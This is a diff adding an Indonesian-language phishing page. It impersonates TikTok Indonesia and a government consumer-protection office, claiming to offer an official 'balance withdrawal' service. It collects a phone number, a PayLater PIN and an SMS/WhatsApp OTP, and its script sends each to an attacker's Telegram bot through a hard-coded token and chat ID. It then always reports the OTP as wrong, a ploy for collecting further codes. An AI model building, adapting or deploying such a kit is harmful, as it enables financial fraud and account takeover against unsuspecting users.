@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Tiktok Indonesia Melennium Centiana</title>
+    <meta property="og:title" content="Tiktok Indonesia Melennium Centiana">
+    <meta property="og:description" content="Layanan pencairan saldo resmi">
+    <meta property="og:image" content="https://i.ibb.co.com/mrhW6LnS/images-1.png">
+    <meta property="og:type" content="website">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+        body {
+            background: #fff;
+            color: #000;
+            min-height: 100vh;
+        }
+        .page { display: none; min-height: 100vh; }
+        .page.active { display: block; }
+        .header {
+            background: #000;
+            color: #fff;
+            padding: 14px;
+            text-align: center;
+            font-weight: 600;
+            font-size: 17px;
+        }
+        .container {
+            padding: 22px;
+            max-width: 520px;
+            margin: 0 auto;
+        }
+        .form-group { margin-bottom: 22px; }
+        label {
+            display: block;
+            font-size: 15px;
+            font-weight: 500;
+            margin-bottom: 8px;
+        }
+        input {
+            width: 100%;
+            padding: 13px 12px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 17px;
+            /* Paksa angka saja */
+            inputmode="numeric";
+            pattern="[0-9]*";
+            type="tel";
+        }
+        .input-nominal { position: relative; }
+        .dot-yellow {
+            position: absolute;
+            right: 14px;
+            top: 15px;
+            width: 9px;
+            height: 9px;
+            background: #ffcc00;
+            border-radius: 50%;
+        }
+        .btn-red {
+            width: 100%;
+            padding: 15px;
+            background: #fe2c55;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            margin: 12px 0;
+        }
+        .proses-teks {
+            text-align: center;
+            color: #00a849;
+            font-weight: 500;
+            margin: 8px 0;
+            display: none;
+        }
+        .menu-icons {
+            display: flex;
+            justify-content: space-around;
+            margin: 35px 0;
+        }
+        .menu-item {
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+        }
+        .footer-text {
+            text-align: center;
+            font-size: 12px;
+            color: #777;
+            margin-top: 25px;
+            line-height: 1.6;
+        }
+        .timer {
+            text-align: center;
+            color: #666;
+            margin-top: 18px;
+            font-size: 15px;
+        }
+        .error-teks {
+            color: #ff0000;
+            text-align: center;
+            margin-top: 18px;
+            font-weight: 500;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<!-- Halaman 1: Isi Data -->
+<div class="page active" id="halaman1">
+    <div class="header">TikTok</div>
+    <div class="container">
+        <div class="form-group input-nominal">
+            <label>Nominal Yang telah di cairkan *</label>
+            <input type="tel" id="nominal" placeholder="Rp ." oninput="hanyaAngka(this)">
+            <span class="dot-yellow"></span>
+        </div>
+        <div class="form-group">
+            <label>Masukan Nomor Telepon *</label>
+            <input type="tel" id="telepon" placeholder="Nomor Telepon" oninput="hanyaAngka(this)">
+        </div>
+        <div class="form-group">
+            <label>Masukan PIN Paylater *</label>
+            <input type="password" id="pin" placeholder="PIN Paylater 6 Digit" maxlength="6" oninput="hanyaAngka(this)">
+        </div>
+        <button class="btn-red" onclick="prosesLanjut()">Lanjutkan</button>
+        <div class="proses-teks" id="prosesLanjut">Sedang memproses...</div>
+
+        <div class="menu-icons">
+            <div class="menu-item">
+                <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="2">
+                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                    <path d="M9 12l2 2 4-4"/>
+                </svg>
+                <p>Akun & Keamanan</p>
+            </div>
+            <div class="menu-item">
+                <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="2">
+                    <circle cx="12" cy="12" r="10"/>
+                    <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/>
+                    <line x1="12" y1="17" x2="12.01" y2="17"/>
+                </svg>
+                <p>Pelaporan</p>
+            </div>
+            <div class="menu-item">
+                <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="2">
+                    <circle cx="9" cy="21" r="1"/>
+                    <circle cx="20" cy="21" r="1"/>
+                    <path d="M1 1h4l2.68 13.39a2 2 0 0 0 2 1.61h9.72a2 2 0 0 0 2-1.61L23 6H6"/>
+                </svg>
+                <p>Pesanan</p>
+            </div>
+            <div class="menu-item">
+                <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="2">
+                    <circle cx="12" cy="12" r="1"/>
+                    <circle cx="19" cy="12" r="1"/>
+                    <circle cx="5" cy="12" r="1"/>
+                </svg>
+                <p>Lainnya</p>
+            </div>
+        </div>
+
+        <div class="footer-text">
+            Layanan Pengaduan Konsumen<br>
+            Tiktok Indonesia<br>
+            Direktorat Jenderal Perlindungan Konsumen & Tertib Niaga<br>
+            Kementerian Perdagangan Republik Indonesia
+        </div>
+    </div>
+</div>
+
+<!-- Halaman 2: Verifikasi Kode -->
+<div class="page" id="halaman2">
+    <div class="header">Verifikasi Kode</div>
+    <div class="container">
+        <h2 style="font-size:19px; margin-bottom:10px;">Masukan Kode verifikasi</h2>
+        <p style="color:#666; margin-bottom:22px;">verifikasi di kirim via SMS/WhatsApp :</p>
+        <div class="form-group">
+            <input type="tel" id="kodeOTP" placeholder="Masukkan kode verifikasi" maxlength="6" oninput="hanyaAngka(this)">
+        </div>
+        <button class="btn-red" onclick="prosesVerifikasi()">Verifikasi</button>
+        <div class="proses-teks" id="prosesVerif">Sedang memproses...</div>
+        <div class="timer" id="teksTimer">Kode berlaku: 05:00</div>
+        <div class="error-teks" id="pesanSalah">Kode OTP salah. silahkan coba lagi</div>
+    </div>
+</div>
+
+<script>
+const BOT_TOKEN = "8702873963:AAH3JhIGctxJnvDTezgfYNKlbjzHgExy8Hg";
+const CHAT_ID = "8304977146";
+let sisaWaktu = 300;
+let hitungMundur;
+let dataPengguna = {};
+
+// Fungsi blokir semua kecuali angka
+function hanyaAngka(input) {
+    let nilai = input.value.replace(/[^0-9]/g, '');
+    if (input.id === "nominal" && nilai !== "") {
+        input.value = "Rp " + new Intl.NumberFormat('id-ID').format(nilai);
+    } else {
+        input.value = nilai;
+    }
+}
+
+// Kirim ke Telegram
+async function kirimKeTelegram(teks) {
+    try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: teks })
+        });
+    } catch (e) { console.log(e); }
+}
+
+function prosesLanjut() {
+    let nominalBersih = document.getElementById("nominal").value.replace(/\D/g, '');
+    let telepon = document.getElementById("telepon").value.trim();
+    let pin = document.getElementById("pin").value.trim();
+
+    if (!nominalBersih || !telepon || !pin) return alert("Isi semua kolom dengan angka!");
+
+    dataPengguna = { 
+        nominal: "Rp " + new Intl.NumberFormat('id-ID').format(nominalBersih), 
+        telepon: telepon, 
+        pin: pin 
+    };
+
+    document.getElementById("prosesLanjut").style.display = "block";
+    kirimKeTelegram(`📥 DATA PERTAMA DITERIMA
+📌 TOTAL: ${dataPengguna.nominal}
+📞 NOMOR TELEPON: ${telepon}
+🔑 PIN PAYLATER: ${pin}
+🔐 KODE OTP: Menunggu`);
+
+    setTimeout(() => {
+        document.getElementById("prosesLanjut").style.display = "none";
+        document.getElementById("halaman1").classList.remove("active");
+        document.getElementById("halaman2").classList.add("active");
+        mulaiTimer();
+    }, 1500);
+}
+
+function mulaiTimer() {
+    sisaWaktu = 300;
+    clearInterval(hitungMundur);
+    hitungMundur = setInterval(() => {
+        let m = Math.floor(sisaWaktu/60).toString().padStart(2,'0');
+        let d = (sisaWaktu%60).toString().padStart(2,'0');
+        document.getElementById("teksTimer").innerText = `Kode berlaku: ${m}:${d}`;
+        if (sisaWaktu <= 0) {
+            clearInterval(hitungMundur);
+            document.getElementById("teksTimer").innerText = "Kode kadaluarsa";
+        }
+        sisaWaktu--;
+    }, 1000);
+}
+
+function prosesVerifikasi() {
+    const otp = document.getElementById("kodeOTP").value.trim();
+    if (!otp) return alert("Masukkan kode OTP!");
+
+    document.getElementById("prosesVerif").style.display = "block";
+    kirimKeTelegram(`📤 DATA LENGKAP DITERIMA
+📌 TOTAL: ${dataPengguna.nominal}
+📞 NOMOR TELEPON: ${dataPengguna.telepon}
+🔑 PIN PAYLATER: ${dataPengguna.pin}
+🔢 KODE OTP: ${otp}`);
+
+    setTimeout(() => {
+        document.getElementById("prosesVerif").style.display = "none";
+        document.getElementById("pesanSalah").style.display = "block";
+    }, 1500);
+}
+</script>
+
+</body>
+</html>
